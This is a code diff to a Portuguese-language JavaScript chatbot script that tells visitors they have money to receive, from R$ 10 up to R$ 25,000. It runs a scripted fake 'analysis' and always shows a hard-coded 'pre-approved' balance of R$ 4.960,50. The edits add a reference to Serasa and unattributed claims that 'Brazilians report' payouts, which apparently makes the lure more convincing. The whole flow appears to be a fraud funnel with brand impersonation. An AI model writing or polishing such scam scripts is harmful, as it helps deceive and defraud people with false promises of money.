@@ -424,11 +424,11 @@ const flow = {
     messages: ["Você já teve contas bancarias bloqueadas ou perdidas ?"],
     choices: [
       { label: "Sim, já tive", next: "bloco4" },
-      { label: "Não, Estão todas ativas ", next: "bloco4" },
+      { label: "Não, estão todas ativas ", next: "bloco4" },
     ]
   },
   bloco4: {
-    messages: ["Você já ouviu falar sobre os valores disponíveis ?"],
+    messages: ["Você já ouviu falar sobre os valores disponíveis com Serasa ?"],
     choices: [
       { label: "Sim, já conheço", next: "bloco5" },
       { label: "Não, seria uma novidade", next: "bloco5" }
@@ -436,7 +436,7 @@ const flow = {
   },
   bloco5: {
     messages: [
-      "Os valores liberados podem variar entre R$ 10,00 ou R$ 25.000,00 em nosso programa! ",
+      "Brasileiros relatam que: Valores liberados podem variar entre R$ 10,00 há R$ 25.000,00 em nosso programa! Permaneça em nosso chat para verificar status de aprovação. ",
     ],
     imagePlaceholder: "ADICIONAR IMAGEM AQUI",
     choices: [{ label: "Verificar meus valores agora mesmo", next: "bloco6" }],
@@ -447,16 +447,16 @@ const flow = {
       "Estamos verificando valores...",
       "Só um momento...",
       "Pronto!"
-    ],
-    card: {
-      title: "ANALISE CONCLUIDA",
-      lines: [
-        "Autenticidade Confirmada!",
-        "Saldo Disponível Para Receber: R$ 4.960,50",
-        "Status: Pré-aprovado,"
-      ]
-    },
-    choices: [{ label: "Continuar", next: "bloco7" }]
+  ],
+card: {
+  title: "ANALISE CONCLUIDA",
+  lines: [
+    "Autenticidade Confirmada!",
+    'Saldo Disponível Para Receber: <span style="color: #2E9439;">R$ 4.960,50</span>',
+    'Status: <span style="color: #FBBD09;">Pré-aprovado</span>'
+  ]
+},
+choices: [{ label: "Continuar", next: "bloco7" }]
   },
   bloco7: {
     messages: [
